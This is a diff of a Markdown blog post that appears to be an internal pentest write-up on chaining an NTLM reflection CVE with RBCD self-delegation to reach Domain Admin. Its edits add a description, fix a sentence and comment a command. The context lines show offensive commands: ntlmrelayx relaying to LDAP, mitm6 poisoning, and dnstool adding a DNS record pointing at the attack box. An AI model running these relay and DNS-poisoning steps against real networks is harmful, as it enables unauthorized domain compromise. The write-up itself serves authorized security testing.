@@ -10,6 +10,7 @@ tags:
   - internal-pentest
 categories:
   - research
+description: "Chaining CVE-2025-33073 (NTLM reflection with MIC bypass) and RBCD self-delegation to reach Domain Admin when every classic SMB/LDAP relay path is blocked by the client signing flag."
 ---
 
 ## The Setup That Looked Easy
@@ -98,7 +99,7 @@ sudo ntlmrelayx.py -t ldap://10.10.10.10 --delegate-access
 sudo mitm6 -d corp.local
 ```
 
-WPAD requests came in. Hours passed. We captured machine account WPAD requests, but never a user account with enough privileges to do anything useful with. Dead end.
+WPAD requests came in. Hours passed. We captured machine account WPAD requests, but never a user account with enough privileges to do anything useful. Dead end.
 
 ### Attempt 4: WebDAV Coercion
 
@@ -137,7 +138,7 @@ Create a DNS record pointing to our attack box:
 ```
 python3 dnstool.py -u 'CORP\testuser' -p 'Provided2025!' \
   -a add -r 'evilrecord' -d 10.10.10.200 \
-  --dns-ip 10.10.10.10 10.10.10.10
+  --dns-ip 10.10.10.10 10.10.10.10   # --dns-ip = DNS server to update; trailing arg = target DC (both DC01)
 ```
 
 Verify propagation:
